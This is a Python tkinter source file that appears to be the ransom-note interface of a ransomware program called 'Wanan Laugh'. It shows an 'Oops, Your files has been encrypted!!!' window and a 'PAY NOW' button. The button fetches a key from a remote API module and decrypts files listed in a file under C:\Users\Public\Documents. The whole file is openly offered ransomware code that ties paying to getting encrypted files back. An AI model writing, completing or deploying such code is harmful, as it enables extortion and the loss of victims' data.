import tkinter as tk
from PIL import ImageTk, Image
import services.api_services as api
import encrypt.encrypt_file as enc
import decrypt.decrypt_file as dec
import services.get_files as get_files
import services.get_dirs as get_dirs
import os
import sys

RED_BG = '#A0153E'
WHITE = '#EEEDED'


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS2
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def pay_now():
  # get key from data
  node = api.get_node()
  key = api.get_key(node=node)

  # child screen
  noti_screen = tk.Toplevel()
  ico = Image.open(resource_path('assets\\hacker.ico'))
  ico_photo = ImageTk.PhotoImage(ico)
  noti_screen.iconphoto(False, ico_photo)
  noti_screen.resizable(False, False)

  noti_label = tk.Label(
    master=noti_screen,
    text='All your files have been decrypted!!!', 
    font=40, 
    width=30, 
    height=10, 
    bg=RED_BG, 
    fg=WHITE
  )
  noti_label.pack()
  with open('C:\\Users\\Public\\Documents\\DONT_DELETE.txt') as all_file_enc:
    # decrypt file
    for f in all_file_enc.readlines():
      dec.dec(filename=f.strip(), key=key)


# main window
main_window = tk.Tk()
main_window.title('Wanan Laugh')
main_window.resizable(False, False)

# main frame
main_frame = tk.Frame(master=main_window, bg=RED_BG)
main_frame.pack(
  fill='both',
  expand=True,
)

# label thong bao 
label = tk.Label(
  master=main_frame, 
  text='Oops, Your files has been encrypted!!!', 
  background=RED_BG, 
  foreground=WHITE,
  font=10
)
label.pack()


# icon window
ico = Image.open(resource_path('assets\\hacker.ico'))
ico_photo = ImageTk.PhotoImage(ico)
main_window.iconphoto(False, ico_photo)


# img label
image_original = Image.open(resource_path('assets\\banner.png')).resize((700, 500))
main_window.image_tk = ImageTk.PhotoImage(image_original)

label_image = tk.Label(master=main_frame, image=main_window.image_tk, bg=RED_BG)
label_image.pack(expand=1, fill='both')

    # nut chuyen tien
pay_btn = tk.Button(
  master=main_frame, 
  text='PAY NOW', 
  width=10, 
  height=5,
  borderwidth=1,
  bg=RED_BG,
  foreground=WHITE,
  font=15,
  command=pay_now,
)
pay_btn.pack()
# Nút để mở cửa sổ phụ

